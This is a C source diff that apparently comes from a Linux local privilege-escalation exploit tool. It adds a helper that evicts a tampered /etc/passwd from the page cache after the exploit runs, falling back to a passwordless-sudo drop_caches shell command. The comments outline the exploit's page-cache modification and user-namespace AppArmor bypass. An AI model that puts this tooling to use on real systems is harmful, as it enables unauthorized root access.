@@ -260,6 +260,46 @@ gid_t real_gid_for_target(void)
     return (gid_t)outer;
 }
 
+/* Best-effort eviction of /etc/passwd from the page cache. Used by
+ * the --no-shell path to revert the page-cache modification after a
+ * successful exploit + verify.
+ *
+ * The naive `posix_fadvise(POSIX_FADV_DONTNEED)` is unreliable here:
+ * since Linux 6.3, fadvise requires write access to the file, and we
+ * typically don't have write access to /etc/passwd from inside the
+ * AA bypass userns (root in userns maps to overflow uid in init ns,
+ * which doesn't own the file).
+ *
+ * So we try in order:
+ *   1. posix_fadvise on a fresh O_RDONLY fd (best case)
+ *   2. sudo drop_caches via the system shell — works if the user has
+ *      passwordless sudo, which is common on test VMs but a
+ *      reasonable assumption to fail closed on
+ *
+ * Returns true if the cache was definitely cleared, false otherwise.
+ * Caller should treat false as "page cache may still be modified —
+ * tell the user to reboot if their session breaks". */
+bool try_revert_passwd_page_cache(void)
+{
+    bool ok = false;
+#ifdef POSIX_FADV_DONTNEED
+    int fd = open("/etc/passwd", O_RDONLY);
+    if (fd >= 0) {
+        if (posix_fadvise(fd, 0, 0, POSIX_FADV_DONTNEED) == 0) ok = true;
+        close(fd);
+    }
+#endif
+
+    /* Even if fadvise returned 0, modern kernels silently no-op when
+     * we lack write access — verify by re-reading and comparing to
+     * what's on disk via O_DIRECT. Too fiddly. Just always also try
+     * drop_caches as belt+suspenders. */
+    int rc = system("sudo -n /bin/sh -c 'echo 3 > /proc/sys/vm/drop_caches' "
+                    ">/dev/null 2>&1");
+    if (rc == 0) ok = true;
+    return ok;
+}
+
 bool ssh_lockout_check(const char *target_user)
 {
     const char *ssh_conn = getenv("SSH_CONNECTION");
